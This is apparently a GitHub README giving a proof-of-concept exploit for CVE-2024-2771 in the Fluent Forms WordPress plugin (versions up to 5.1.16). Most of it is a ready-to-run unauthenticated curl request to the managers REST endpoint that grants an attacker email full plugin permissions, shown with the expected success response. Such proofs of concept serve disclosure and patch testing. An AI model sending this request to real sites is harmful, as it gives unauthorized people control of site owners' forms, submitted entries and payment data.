# CVE-2024-2771-PoC
CVE-2024-2771 Proof-of-Concept 

The Contact Form Plugin by Fluent Forms for Quiz, Survey, and Drag & Drop WP Form Builder plugin for WordPress is vulnerable to privilege escalation due to a missing capability check on the /wp-json/fluentform/v1/managers REST API endpoint in all versions up to, and including, 5.1.16. This makes it possible for unauthenticated attackers to grant users with Fluent Form management permissions which gives them access to all of the plugin's settings and features. This also makes it possible for unauthenticated attackers to delete manager accounts.

**Prerequisites**
- WordPress site with Contact Form – Fluent Forms ≤ 5.1.16 active.
- Attacker can reach the site’s REST API (no authentication needed).

**Exploit Command**
```
# 1. Grant full Fluent Forms permissions to an arbitrary email
curl -i -X POST "http://TARGET/wp-json/fluentform/v1/managers" \
     -H "Content-Type: application/json" \
     -d '{
           "manager": {
             "email": "attacker@example.com",
             "permissions": [
               "fluentform_dashboard_access",
               "fluentform_forms_manager",
               "fluentform_entries_viewer",
               "fluentform_manage_entries",
               "fluentform_view_payments",
               "fluentform_manage_payments",
               "fluentform_settings_manager",
               "fluentform_full_access"
             ]
           }
         }'
```

Expected Response
```
HTTP/1.1 200 OK
{
  "message": "Manager has been saved.",
  "manager": {
    "id": 2,
    "email": "attacker@example.com",
    "permissions": [
      "fluentform_dashboard_access",
      "fluentform_forms_manager",
      "fluentform_entries_viewer",
      "fluentform_manage_entries",
      "fluentform_view_payments",
      "fluentform_manage_payments",
      "fluentform_settings_manager",
      "fluentform_full_access"
    ]
  }
}

```
**Screenshot**
<img width="1451" height="603" alt="Screenshot 2025-08-01 105801" src="https://github.com/user-attachments/assets/d7fdcaf1-1583-4473-a075-e8ca998c29a8" />
